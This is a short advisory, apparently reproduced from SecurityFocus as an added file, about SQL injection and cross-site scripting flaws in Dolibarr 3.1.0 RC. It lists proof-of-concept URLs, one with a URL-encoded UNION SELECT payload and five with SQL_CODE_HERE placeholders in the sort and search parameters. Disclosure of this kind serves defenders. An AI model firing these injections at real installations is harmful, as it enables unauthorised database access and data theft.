@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/50777/info
+ 
+Dolibarr is prone to multiple cross-site scripting and SQL-injection vulnerabilities because it fails to properly sanitize user-supplied input before using it in dynamically generated content.
+ 
+Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+ 
+Dolibarr 3.1.0 RC is vulnerable; prior versions may also be affected. 
+
+http://www.example.com/user/index.php?sall=1%%27%29%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%201,version%28%29, 3,4,5,6,7,8,9,10,11,12,13,14%20--%20
+http://www.example.com/user/index.php?begin=search_user=&sall=&&sortfield=SQL_CODE_HERE
+http://www.example.com/user/index.php?begin=search_user=&sall=&sortfield=u.login&sortorder=SQL_CO DE_HERE
+http://www.example.com/user/group/index.php?begin=search_user=&sall=&&sortfield=SQL_CODE_HERE
+http://www.example.com/user/group/index.php?begin=search_user=&sall=&sortfield=u.login&sortorder= SQL_CODE_HERE
+http://www.example.com/user/group/index.php?sall=SQL_CODE_HERE
